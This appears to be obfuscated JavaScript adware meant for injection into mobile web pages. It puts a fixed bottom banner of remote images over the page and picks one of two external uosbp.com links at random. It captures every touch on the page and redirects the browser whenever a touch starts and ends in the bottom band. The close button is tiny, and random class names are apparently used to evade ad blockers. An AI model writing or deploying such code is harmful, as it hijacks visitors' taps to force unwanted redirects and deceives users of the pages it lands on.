;(function() {
        var I = document.getElementsByTagName("body")[0];
        var U = window.location.href;
        var an = {}
            , aj = document;

        var ac = {};
        function ad(g) {
            g = g || window;
            var d = g.document;
            var h = d.compatMode == "BackCompat" ? d.body.clientWidth : d.documentElement.clientWidth;
            var b = d.compatMode == "BackCompat" ? d.body.clientHeight : d.documentElement.clientHeight;
            var k = d.compatMode == "BackCompat" ? d.body.scrollLeft : d.documentElement.scrollLeft;
            var c = d.compatMode == "BackCompat" ? d.body.scrollTop : d.documentElement.scrollTop;
            var e = d.compatMode == "BackCompat" ? d.body.scrollWidth : d.documentElement.scrollWidth;
            var i = d.compatMode == "BackCompat" ? d.body.scrollHeight : d.documentElement.scrollHeight;
            var f = Math.max(e, h);
            var j = Math.max(i, b);
            return {
                clientWidth: h,
                clientHeight: b,
                scrollLeft: k,
                scrollTop: c,
                scrollWidth: e,
                scrollHeight: i,
                width: f,
                height: j
            }
        }
        var __w = ad().clientWidth;

        ac.config = {
            height: parseInt('200', 10) * (__w / 640),
            odds: parseInt('0', 10),
        }

        var _h = ac.config.height;
        var _url = '';
        ac.touchSatrtFunc = function(evt) {
            try {
                var touch = evt.touches[0];
                var x = Math.ceil(touch.pageX);
                var y = Math.ceil(touch.pageY);
                var ch = Math.ceil(document.body.clientHeight ? document.body.clientHeight : document.documentElement.clientHeight);
                startTop = Math.ceil(document.body.scrollTop ? document.body.scrollTop : document.documentElement.scrollTop);

                //记录触点初始位置
                startX = x;
                startY = y;

                EndX = x;
                EndY = y;

            } catch (e) {
                console.log('touchSatrtFunc：' + e.message);
            }
        }

        ac.touchMoveFunc = function(evt) {
            try {
                var touch = evt.touches[0];
                var x = Number(touch.pageX);
                var y = Number(touch.pageY);

                EndX = x;
                EndY = y;

            } catch (e) {
                console.log('touchMoveFunc：' + e.message);
            }
        }

        ac.touchEndFunc = function(evt) {
            try {

                var x = EndX;
                var y = EndY;
                var t = Math.ceil(document.body.scrollTop ? document.body.scrollTop : document.documentElement.scrollTop);
                var ch = Math.ceil(document.body.clientHeight ? document.body.clientHeight : document.documentElement.clientHeight);

                var startS = startY - startTop;
                startS = ch - startS;
                var endS = y - t;
                endS = ch - endS;
                //console.log('1:startY='+startY+';startTop='+startTop+';startS='+startS+';endS='+endS+';_h='+_h+';t='+t+';ch='+ch);

                if (startS <= _h && endS <= _h) {
                    ac.hha();
                    window.location.href = _url;
                    //console.log('2:startS='+startS+';endS='+endS+';_h='+_h);
                }
            } catch (e) {
                console.log('touchEndFunc' + e.message);
            }
        }

        ac.bindEvent = function() {
            document.addEventListener('touchstart', ac.touchSatrtFunc, false);
            document.addEventListener('touchmove', ac.touchMoveFunc, false);
            document.addEventListener('touchend', ac.touchEndFunc, false);
        }

        ac.init = function() {
            try {
                document.createEvent("TouchEvent");
                ac.bindEvent();
            } catch (e) {
                console.log("sadf！" + e.message);
            }
        }
        ac.hha = function() {
            _h = ac.config.height;
        }
        _h += Math.ceil(Math.random() * 100) <= ac.config.odds ? 360 : 0;

        an.$ = function(b) {
            if (typeof b == "string") {
                return aj.getElementById(b)
            } else {
                return !1
            }
        }
        ;
        an.hi = function() {
            setTimeout(function() {
                if (an.$("_ucEnterTip")) {
                    an.$("_ucEnterTip").style.display = "none"
                }
            }, 1500)
        }
        ;
        an.hi();
        var X = [];
        X[0] = [10, 'https://2526.uosbp.com/i.html?id=2526'];
        X[1] = [10, 'https://2599.uosbp.com/i.html?id=2599'];

        var q = ac.config.height;
        var al = ac.config.height;
        var Y = [];
        Y[0] = 'https://p1.pstatp.com/large/pgc-image/0cbc5762056c4b90bd36c9b9512d71ce';
        Y[1] = 'https://p1.pstatp.com/large/pgc-image/4b77590039154ce8a3625f21f249e4a0';
        Y[2] = 'https://p1.pstatp.com/large/pgc-image/968ec256bcc64d1e9b336ea0e168143d';
        Y[3] = 'https://p1.pstatp.com/large/pgc-image/9ec4a801941046e59d44affd3ac15245';
        Y[4] = 'https://p1.pstatp.com/large/pgc-image/fa87f5572639444281fd0261d00a321b';
        Y[5] = 'https://p1.pstatp.com/large/pgc-image/7dba7f96312c4faca9ee8dbb12c266c8';
        Y[6] = 'https://p1.pstatp.com/large/pgc-image/9642107ebf034795b2c22e6a6ffbba42';
        Y[7] = 'https://p1.pstatp.com/large/pgc-image/69d6852645574297b7d72bad2651f1f3';
        Y[8] = 'https://p1.pstatp.com/large/pgc-image/5d199efcd71043f59c29c0cb98fa9a08';
        Y[9] = 'https://p1.pstatp.com/large/pgc-image/a8316d1b82d64a6890749022ee47346a';
        Y[10] = 'https://p1.pstatp.com/large/pgc-image/1597c3b9ead649f881568c9bfa2bb3e5';
        Y[11] = 'https://p1.pstatp.com/large/pgc-image/7c08f820f86d482e8e92e3281417fd23';
        Y[12] = 'https://p1.pstatp.com/large/pgc-image/58976a321e334041ad84bbf1a01deebc';
        Y[13] = 'https://p1.pstatp.com/large/pgc-image/fba40d01337a415aa0983e53897991f9';
        Y[14] = 'https://p1.pstatp.com/large/pgc-image/a921a6fff30d4f5fa620cd1deb60c2d5';
        Y[15] = 'https://p1.pstatp.com/large/pgc-image/847424afcb314202b67db08dcb1adb28';
        Y[16] = 'https://p1.pstatp.com/large/pgc-image/a078d6cb927648c6bdcc1de6ca176e94';
        Y[17] = 'https://p1.pstatp.com/large/pgc-image/c22a4193e529486b91d1798b9c7390d8';
        Y[18] = 'https://p1.pstatp.com/large/pgc-image/9412c4d723084b10b81db3dcc379a2ca';

        an.chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
        an.rc = function(d) {
            var c = "";
            for (var b = 0; b < d; b++) {
                var f = Math.ceil(Math.random() * 25);
                c += an.chars[f]
            }
            return c
        }
        ;
        var W = an.rc(8);
        var ae = an.rc(10);
        var ah = an.rc(8);
        var a = an.rc(8);

        function P(c) {
            var f = 0;
            for (var d = 0; d < c.length; d++) {
                f += c[d][0]
            }
            var b = Math.floor(Math.random() * f);
            var e = 0;
            for (var d = 0; d < c.length; d++) {
                e += c[d][0];
                if (b < e) {
                    ai(ae, c[d][1]);
                    break
                }
            }
        }

        var N = V();
        var H = navigator.userAgent.toLowerCase();
        var J = ad();
        var M = J.clientWidth;
        var R = 1;
        var T = 1;
        var ag = T * R;
        var af = Y.sort(L)
            , am = af.length
            , aa = 0;

        function ai(c, b) {
            Q(c);
            setTimeout(function() {
                S(c, b);
                _url = b;
                ac.init();
                document.getElementById(ah).addEventListener("click", function() {window.open(b)
                }, false);
                var d = setInterval(function() {
                    var e = document.getElementsByTagName("body")[0];
                    for (var i = 0; i < Y.length; i++) {
                        ak(e, ah + "_body_" + i);
                    }
                    S(c, e)
                }, 10000)
            }, 200)
        }

        function S(c, d) {
            for (var e = 0; e < R; e++) {
                for (var b = 0; b < T; b++) {
                    var f = af[aa];
                    aa++;
                    if (aa >= am) {
                        aa = 0
                    }
                    O(I, ah + "_body_" + aa)
                }
            }
        }

        function O(g, f) {
            var d = g.className;
            if (d == "" || d == " ") {
                g.className = f
            } else {
                var c = d.split(" ");
                var h = [];
                var e = 0;
                for (var b = 0; b < c.length; b++) {
                    if (c[b] == f) {
                        e = 1
                    }
                }
                if (e == 0) {
                    g.className = d + " " + f
                }
            }
        }

        function ak(g, f) {
            var d = g.className;
            if (d == "" || d == " ") {
                g.className = d
            } else {
                var b = d.split(" ");
                var c = [];
                for (var e = 0; e < b.length; e++) {
                    if (b[e] != f) {
                        c.push(b[e])
                    }
                }
                var h = "";
                for (var e = 0; e < c.length; e++) {
                    h += (c[e] + " ")
                }
                g.className = h
            }
        }

        function L(b, c) {
            return Math.random() > 0.5 ? -1 : 1
        }

        function K() {
            document.getElementById(W).style.display = "none";
            document.getElementById(ah).style.display = "none";
            var b = document.getElementsByTagName("body")[0];
            ak(b, ah + "_body");
            _h = 0;
        }

        function Q(l) {
            var p = V();
            if (p == 3) {
                return false
            }
            O(I, ah + "_body");
            var i = al;
            var d = document.createElement("div");
            var r = document.createElement("img");
            r.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAUCAYAAACJfM0wAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAfRJREFUeNpiZGBg0GSgAWBioBFgBmJRGCc7O1ucjY3t3+PHj/+QYsiRI0d8REREPh89evQLsrgmDD99+nT5z58/H3l7e5sii+PDW7duTfn169eT69ev96LJoSr88ePHHZDhZWVlToQMvX///uw/f/68//DhwyF0OYww5uDg8P3379/P5ubmhUDDJXF5//jx476SkpKuX758udzW1taATQ1W13z//v020OWPExMTbdHlbt682Q9y6adPn07i0o8zVYSEhEQBXf5j5syZy4GGi8DE9+7d6yIvLx8INPRcfn5+CS79jITS8bdv3zawsLBwBwIBMHi89fT08oHx8JCHhycSnz5GYjII0PB1TExMnMDYfwnEb0tLS9vnz5//huIMcvHixfmsrKwi3NzcmsCgmUTIUIwMgg2cPn06SF9fP+Xly5e7mJmZmezs7GKePHmy7cKFC98IGY4znQIjKvf3799vgUFxE5Y6vn79ehUYHM8nTpzoTyCdY5cAer8FGEn33717txddjkjDMQXnzJkTAnTpK1Ba1tTUNMSmBmj4ZZDhra2tHkQZfO7cuQZQxnj//v0BQmUG1PAXOLI/glNTU+MGUggqL4gIQzAGZukLoGSIbjgLciwCXfnrwYMHK9XU1GYQW2SCMsq9e/cKyMogg6oGAQgwAK8UInW+KGpJAAAAAElFTkSuQmCC";
            d.id = W;
            d.className = a;
            d.appendChild(r);
            d.onclick = function() {
                K()
            }
            ;
            if (document.compatMode == "BackCompat") {
                var c = document.body
            } else {
                var c = document.documentElement
            }

            var n = q;
            var k = "." + W + "{}";
            k += "." + a + "{width:20px;height:20px;position:fixed;z-index: 2147483647;bottom:" + n + "px;right:0px;background:rgba(0,0,0,0.3);text-align:center;line-height:20px;color:#fff}";
            k += "." + ah + "_xe{position:fixed !important;z-index:2147483647 !important;width:30px;height:30px;}";
            k += "." + ah + "_body{padding-bottom:" + i + "px}";
            //k += "." + ah + '_body:after{content:"";display: block;width:100%;z-index: 2147483647;height:' + q + "px;position:fixed;left:0;bottom:0;background-size:100% 100% !important;}";
            k += "." + ah + "_xe {background-image:url(" + Y[0] + ");background-size:" + M + "px " + q + "px;background-repeat:no-repeat}";
            // k += ".fixed{width:30px;height:30px;position:fixed;left:0;bottom:0;z-index: 2147483647;}"

            for (var g = 0; g < Y.length; g++) {
                k += "." + ah + "_body_" + g + ":after{background:url(" + Y[g] + ");}"
            }

            var o = 0;
            var r = 0;
            var b = "";
            var j = Math.ceil(M / 30);
            var h = Math.ceil(q / 30);

            for (var i = 0; i < 500; i++) {
                b += '<div class="fixed"></div>';
            }
            r3 = h*30 - q;
            for (var e = 0; e < j; e++) {
                for (var f = 0; f < h; f++) {
                    o = e * 30;
                    r = f * 30;
                    r2 = (h-1)*30-r-r3;
                    var _hxx = f * 30;
                    b += '<div class="' + ah + "_" + e + "_" + f + " " + ah + '_xe"></div>';
                    k += "." + ah + "_" + e + "_" + f + "{left:" + o + "px;bottom:" + r2 + "px;background-position:-" + o + "px -" + r + "px;}"
                }
            }

            var s = document.getElementsByTagName("head")[0];
            var m = document.createElement("style");
            if (m.styleSheet) {
                m.styleSheet.cssText = k
            } else {
                m.appendChild(document.createTextNode(k))
            }
            s.appendChild(m);
            var c = document.body;
            Z(b);
            c.appendChild(d)
        }

        function Z(c) {
            var d = document;
            if (c == null) {
                return !1
            }
            var b = d.createElement("div");
            b.id = ah;
            b.innerHTML = c;
            if (d.body) {
                try {
                    d.body.appendChild(b)
                } catch (e) {}
            } else {
                try {
                    d.getElementsByTagName("html")[0].appendChild(b)
                } catch (e) {}
            }
            return !0
        }

        function V() {
            var e = navigator.userAgent.toLowerCase();
            var d = e.match(/ipad/i) == "ipad";
            var b = e.match(/iphone os/i) == "iphone os";
            var c = e.match(/android/i) == "android";
            if (c) {
                return 1
            } else {
                if (b || d) {
                    return 2
                } else {
                    return 3
                }
            }
        }

        setTimeout(function() {
            P(X)
        }, 100);
        function getExtractedNovelData() {}
    }
)()

;
